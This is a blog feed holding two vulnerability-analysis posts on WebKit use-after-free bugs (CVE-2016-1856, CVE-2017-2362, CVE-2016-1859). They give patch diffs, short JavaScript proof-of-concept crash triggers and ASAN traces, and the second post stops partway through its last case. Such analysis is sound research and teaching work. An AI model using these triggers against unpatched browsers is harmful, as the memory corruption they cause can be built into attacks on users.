<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.0.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2017-03-31T19:33:42+08:00</updated><id>/</id><title>連接</title><subtitle></subtitle><author><name>Arayz</name><email>arayz_w@icloud.com</email></author><entry><title>Notes of a simple UAF in TextTrack destructor</title><link href="/933ky/Notes-of-a-simple-UAF-in-TextTrack-destructor/" rel="alternate" type="text/html" title="Notes of a simple UAF in TextTrack destructor" /><published>2017-03-31T00:00:00+08:00</published><updated>2017-03-31T00:00:00+08:00</updated><id>/933ky/Notes-of-a-simple-UAF-in-TextTrack-destructor</id><content type="html" xml:base="/933ky/Notes-of-a-simple-UAF-in-TextTrack-destructor/">&lt;p&gt;CVE-2016-1856 is used by Lokihardt on Pwn2Own 2016, let’s see the patch:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -136,11 +136,11 @@ TextTrack::~TextTrack()
&lt;/span&gt;             m_client-&amp;gt;textTrackRemoveCues(this, m_cues.get());
 
         for (size_t i = 0; i &amp;lt; m_cues-&amp;gt;length(); ++i)
&lt;span class=&quot;gd&quot;&gt;-            m_cues-&amp;gt;item(i)-&amp;gt;setTrack(0);
-        if (m_regions) {
-            for (size_t i = 0; i &amp;lt; m_regions-&amp;gt;length(); ++i)
-                m_regions-&amp;gt;item(i)-&amp;gt;setTrack(0);
-        }
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+            m_cues-&amp;gt;item(i)-&amp;gt;setTrack(nullptr);
+    }
+    if (m_regions) {
+        for (size_t i = 0; i &amp;lt; m_regions-&amp;gt;length(); ++i)
+            m_regions-&amp;gt;item(i)-&amp;gt;setTrack(nullptr);
&lt;/span&gt;     }
     clearClient();
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;It moves &lt;code class=&quot;highlighter-rouge&quot;&gt;if (m_regions) {&lt;/code&gt; out of the code block, which means there is a situation that &lt;strong&gt;m_regions&lt;/strong&gt; exists while &lt;strong&gt;m_cues&lt;/strong&gt; is null.&lt;/p&gt;

&lt;p&gt;The vulnerability can be trigger as follows:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
 	  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;VTTRegion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;video&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;track&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;textTracks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addRegion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;gc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	  &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;track&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;It just creates a &lt;strong&gt;video&lt;/strong&gt; element and append the &lt;strong&gt;TextTrack&lt;/strong&gt; with VTTRegion but no cues. After &lt;code class=&quot;highlighter-rouge&quot;&gt;gc()&lt;/code&gt;, the &lt;code class=&quot;highlighter-rouge&quot;&gt;vr.track&lt;/code&gt; still access the items in the  freed object which didn’t &lt;code class=&quot;highlighter-rouge&quot;&gt;setTrack(0)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Log of ASAN bellows:&lt;/p&gt;

&lt;p&gt;Use:	&lt;code class=&quot;highlighter-rouge&quot;&gt;alert(vr.track)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR: AddressSanitizer: heap-use-after-free on address 0x61400008dc90 at pc 0x00010e2b6d5a bp 0x7fff5efe8890 sp 0x7fff5efe8888
READ of size 8 at 0x61400008dc90 thread T0
    #0 0x10e2b6d59 in JSC::Weak&amp;lt;WebCore::JSDOMObject&amp;gt;::get() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8c9d59)
    #1 0x10e2b6d14 in WebCore::ScriptWrappable::wrapper() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8c9d14)
    #2 0x1103adf16 in WebCore::getInlineCachedWrapper(WebCore::DOMWrapperWorld&amp;amp;, WebCore::ScriptWrappable*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x29c0f16)
    #3 0x1115fb2ca in JSC::JSObject* WebCore::getCachedWrapper&amp;lt;WebCore::TextTrack&amp;gt;(WebCore::DOMWrapperWorld&amp;amp;, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0e2ca)
    #4 0x1115f9c39 in JSC::JSValue WebCore::getExistingWrapper&amp;lt;WebCore::JSTextTrack, WebCore::TextTrack&amp;gt;(WebCore::JSDOMGlobalObject*, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0cc39)
    #5 0x1115f8286 in WebCore::toJS(JSC::ExecState*, WebCore::JSDOMGlobalObject*, WebCore::TextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c0b286)
    #6 0x1116756f7 in WebCore::jsVTTRegionTrack(JSC::ExecState*, long long, JSC::PropertyName) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3c886f7)
    #7 0x1097f345c in JSC::PropertySlot::customGetter(JSC::ExecState*, JSC::PropertyName) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x263145c)
    #8 0x107541b5c in JSC::PropertySlot::getValue(JSC::ExecState*, JSC::PropertyName) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x37fb5c)
    #9 0x107540d50 in JSC::JSValue::get(JSC::ExecState*, JSC::PropertyName, JSC::PropertySlot&amp;amp;) const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x37ed50)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Free:	&lt;code class=&quot;highlighter-rouge&quot;&gt;v = null&lt;/code&gt; –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;gc()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;freed by thread T0 here:
    #0 0x1056ae799 in wrap_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/7.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib+0x43799)
    #1 0x109e6ca94 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2caaa94)
    #2 0x109d61273 in bmalloc::Deallocator::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f273)
    #3 0x109d61215 in bmalloc::Cache::deallocate(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9f215)
    #4 0x109d5fce4 in bmalloc::api::free(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9dce4)
    #5 0x109d5f374 in WTF::fastFree(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/JavaScriptCore.framework/Versions/A/JavaScriptCore+0x2b9d374)
    #6 0x10dddc124 in WTF::RefCounted&amp;lt;WebCore::TrackBase&amp;gt;::operator delete(void*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3ef124)
    #7 0x111942641 in WebCore::LoadableTextTrack::~LoadableTextTrack() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3f55641)
    #8 0x10dddf735 in WTF::RefCounted&amp;lt;WebCore::TrackBase&amp;gt;::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x3f2735)
    #9 0x10fbf4c19 in void WTF::derefIfNotNull&amp;lt;WebCore::LoadableTextTrack&amp;gt;(WebCore::LoadableTextTrack*) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2207c19)
    #10 0x10fbf4b6a in WTF::RefPtr&amp;lt;WebCore::LoadableTextTrack&amp;gt;::~RefPtr() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2207b6a)
    #11 0x10fbefcf4 in WTF::RefPtr&amp;lt;WebCore::LoadableTextTrack&amp;gt;::~RefPtr() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2202cf4)
    #12 0x10fbed228 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2200228)
    #13 0x10fbed264 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2200264)
    #14 0x10fbed2b8 in WebCore::HTMLTrackElement::~HTMLTrackElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22002b8)
    #15 0x10e2cd5ae in WebCore::removeDetachedChildrenInContainer(WebCore::ContainerNode&amp;amp;) (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8e05ae)
    #16 0x10e2aa8ad in WebCore::ContainerNode::removeDetachedChildren() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8bd8ad)
    #17 0x10e2ab291 in WebCore::ContainerNode::~ContainerNode() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x8be291)
    #18 0x10efd5717 in WebCore::Element::~Element() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15e8717)
    #19 0x1135aa912 in WebCore::StyledElement::~StyledElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x5bbd912)
    #20 0x10de0ac64 in WebCore::HTMLElement::~HTMLElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x41dc64)
    #21 0x10fa531d4 in WebCore::HTMLMediaElement::~HTMLMediaElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x20661d4)
    #22 0x10fc1ec77 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x2231c77)
    #23 0x10fc1d8c4 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22308c4)
    #24 0x10fc1d8e8 in WebCore::HTMLVideoElement::~HTMLVideoElement() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x22308e8)
    #25 0x111f110c6 in WebCore::Node::removedLastRef() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x45240c6)
    #26 0x10da04ece in WebCore::Node::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x17ece)
    #27 0x111f014f4 in WebCore::Node::derefEventTarget() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x45144f4)
    #28 0x10e9eff32 in WebCore::EventTarget::deref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1002f32)
    #29 0x10eeef0c9 in WTF::Ref&amp;lt;WebCore::EventTarget&amp;gt;::~Ref() (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x15020c9)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content><category term="933KY" /><category term="Notes" /><category term="UAF" /><category term="Attack Model" /><category term="Lokihardt" /><summary>Notes of CVE-2016-1856</summary></entry><entry><title>A general attack model of UAF on browser</title><link href="/933ky/A-general-attack-model-of-UAF-on-browser/" rel="alternate" type="text/html" title="A general attack model of UAF on browser" /><published>2017-03-31T00:00:00+08:00</published><updated>2017-03-31T00:00:00+08:00</updated><id>/933ky/A-general-attack-model-of-UAF-on-browser</id><content type="html" xml:base="/933ky/A-general-attack-model-of-UAF-on-browser/">&lt;p&gt;Saelo studied a &lt;a href=&quot;http://www.phrack.org/papers/attacking_javascript_engines.html&quot;&gt;case&lt;/a&gt; of attacking JavaScript engines on Phrack. This paper introduced CVE-2016-4622 in detail, which is a very classic case of UAF on JavaScript engines. I found that it is a very general case of attacking web browsers after studying several same case, so I decided to take notes on them.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CVE-2017-2362&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It’s easy to find the git commit of this vulnerability by using a little trick. Let’s see the patch:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -367,19 +361,30 @@ void HTMLFormElement::reset()
&lt;/span&gt;     if (m_isInResetFunction || !frame)
         return;
 
&lt;span class=&quot;gd&quot;&gt;-    m_isInResetFunction = true;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    Ref&amp;lt;HTMLFormElement&amp;gt; protectedThis(*this);
+
+    SetForScope&amp;lt;bool&amp;gt; isInResetFunctionRestorer(m_isInResetFunction, true);
&lt;/span&gt; 
&lt;span class=&quot;gd&quot;&gt;-    if (!dispatchEvent(Event::create(eventNames().resetEvent, true, true))) {
-        m_isInResetFunction = false;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    if (!dispatchEvent(Event::create(eventNames().resetEvent, true, true)))
&lt;/span&gt;         return;
&lt;span class=&quot;gd&quot;&gt;-    }
&lt;/span&gt; 
&lt;span class=&quot;gd&quot;&gt;-    for (auto&amp;amp; associatedElement : m_associatedElements) {
-        if (is&amp;lt;HTMLFormControlElement&amp;gt;(*associatedElement))
-            downcast&amp;lt;HTMLFormControlElement&amp;gt;(*associatedElement).reset();
-    }
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    resetAssociatedFormControlElements();
+}
&lt;/span&gt; 
&lt;span class=&quot;gd&quot;&gt;-    m_isInResetFunction = false;
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+void HTMLFormElement::resetAssociatedFormControlElements()
+{
+    // Event handling can cause associated elements to be added or deleted while iterating
+    // over this collection. Protect these elements until we are done notifying them of
+    // the reset operation.
+    Vector&amp;lt;Ref&amp;lt;HTMLFormControlElement&amp;gt;&amp;gt; associatedFormControlElements;
+    associatedFormControlElements.reserveInitialCapacity(m_associatedElements.size());
+    for (auto* element : m_associatedElements) {
+        if (is&amp;lt;HTMLFormControlElement&amp;gt;(element))
+            associatedFormControlElements.uncheckedAppend(*downcast&amp;lt;HTMLFormControlElement&amp;gt;(element));
+    }
+    
+    for (auto&amp;amp; associatedFormControlElement : associatedFormControlElements)
+        associatedFormControlElement-&amp;gt;reset();
&lt;/span&gt; }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The patch added &lt;strong&gt;HTMLFormElement::resetAssociatedFormControlElements()&lt;/strong&gt; to cache &lt;strong&gt;m_associatedElements&lt;/strong&gt; in a Vector and iterate them instead of iterate &lt;strong&gt;m_associatedElements&lt;/strong&gt; directly. What’s the diffrence between them?&lt;/p&gt;

&lt;p&gt;Check the PoC bellow:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;runTest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;test value&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inserted_div&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;output&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;DOMSubtreeModified&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After debugging with lldb, we know that &lt;code class=&quot;highlighter-rouge&quot;&gt;form.reset()&lt;/code&gt; ran into &lt;code class=&quot;highlighter-rouge&quot;&gt;dispatchSubtreeModifiedEvent()&lt;/code&gt; and call back into &lt;strong&gt;vmEntryToJavaScript&lt;/strong&gt; which cause the event listener called. The script uses &lt;code class=&quot;highlighter-rouge&quot;&gt;form.appendChild(document.createElement(&quot;input&quot;))&lt;/code&gt; to register form elements and get container reallocated, this will free the original elements of &lt;strong&gt;m_associatedElements&lt;/strong&gt; and allocate another.&lt;/p&gt;

&lt;p&gt;So what’s the crux of the issue?&lt;/p&gt;

&lt;p&gt;We can see the &lt;strong&gt;m_associatedElements&lt;/strong&gt; has a &lt;strong&gt;m_&lt;/strong&gt; prefixion which means it is a member variable, but when it is iterating like:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;associatedElement&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;m_associatedElements&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;the compiler caches element’s base address of &lt;strong&gt;m_associatedElements&lt;/strong&gt; in the stack or register, so that TOCTOU is violated.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;(*associatedElement)&lt;/code&gt; will read 8 bytes and cause the UAF come into being.&lt;/p&gt;

&lt;p&gt;It’s amazing that it’s still possible to break TOCTOU when simply access a container, the crux is accessing variable is a runtime operation, which differentiate from accessing from the original memory or the cache memory. It will be dangerous when programmer assumps it must access from origin.&lt;/p&gt;

&lt;p&gt;Another crux is javascript engines allows to overide prototype’s callback, this is a general attack model on browsers, we will disscus this at the end of this article. Now let’s see two KeenLab’s Safari vulnerabilities of Pwn2Own last year.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CVE-2016-1859&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I used another trick to get the commit, now let’s take a look:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gu&quot;&gt;@@ -193,16 +193,21 @@ Node::InsertionNotificationRequest HTMLBodyElement::insertedInto(ContainerNode&amp;amp;
&lt;/span&gt;     // FIXME: It&#39;s surprising this is web compatible since it means a marginwidth and marginheight attribute can
     // magically appear on the &amp;lt;body&amp;gt; of all documents embedded through &amp;lt;iframe&amp;gt; or &amp;lt;frame&amp;gt;.
     // FIXME: Perhaps this code should be in attach() instead of here.
&lt;span class=&quot;gd&quot;&gt;-    HTMLFrameOwnerElement* ownerElement = document().ownerElement();
-    if (is&amp;lt;HTMLFrameElementBase&amp;gt;(ownerElement)) {
-        HTMLFrameElementBase&amp;amp; ownerFrameElement = downcast&amp;lt;HTMLFrameElementBase&amp;gt;(*ownerElement);
-        int marginWidth = ownerFrameElement.marginWidth();
-        if (marginWidth != -1)
-            setIntegralAttribute(marginwidthAttr, marginWidth);
-        int marginHeight = ownerFrameElement.marginHeight();
-        if (marginHeight != -1)
-            setIntegralAttribute(marginheightAttr, marginHeight);
-    }
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+    auto* ownerElement = document().ownerElement();
+    if (!is&amp;lt;HTMLFrameElementBase&amp;gt;(ownerElement))
+        return InsertionDone;
+    
+    auto&amp;amp; ownerFrameElement = downcast&amp;lt;HTMLFrameElementBase&amp;gt;(*ownerElement);
+
+    // Read values from the owner before setting any attributes, since setting an attribute can run arbitrary
+    // JavaScript, which might delete the owner element.
+    int marginWidth = ownerFrameElement.marginWidth();
+    int marginHeight = ownerFrameElement.marginHeight();
+
+    if (marginWidth != -1)
+        setIntegralAttribute(marginwidthAttr, marginWidth);
+    if (marginHeight != -1)
+        setIntegralAttribute(marginheightAttr, marginHeight);
&lt;/span&gt; 
     return InsertionDone;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Notice that &lt;code class=&quot;highlighter-rouge&quot;&gt;int marginHeight = ownerFrameElement.marginHeight();&lt;/code&gt; was moved to before &lt;code class=&quot;highlighter-rouge&quot;&gt;setIntegralAttribute(marginwidthAttr, marginWidth);&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Run the PoC with ASAN, we got logs bellow:&lt;/p&gt;

&lt;p&gt;Use:	&lt;code class=&quot;highlighter-rouge&quot;&gt;ownerFrameElement.marginHeight()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR: AddressSanitizer: heap-use-after-free on address 0x60e00002a370 at pc 0x00011b2893d3 bp 0x7fff53a89c60 sp 0x7fff53a89c58
READ of size 4 at 0x60e00002a370 thread T0
    #0 0x11b2893d2 in WebCore::HTMLFrameElementBase::marginHeight() const (/Users/arayz/arayz/git/WebKit/WebKitBuild/Debug/WebCore.framework/Versions/A/WebCore+0x1c433d2)
......
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Free:	&lt;code class=&quot;highlighter-rouge&quot;&gt;setIntegralAttribute(marginwidthAttr, marginWidth); --&amp;gt; gc()&lt;/code&gt;&lt;/p&gt;

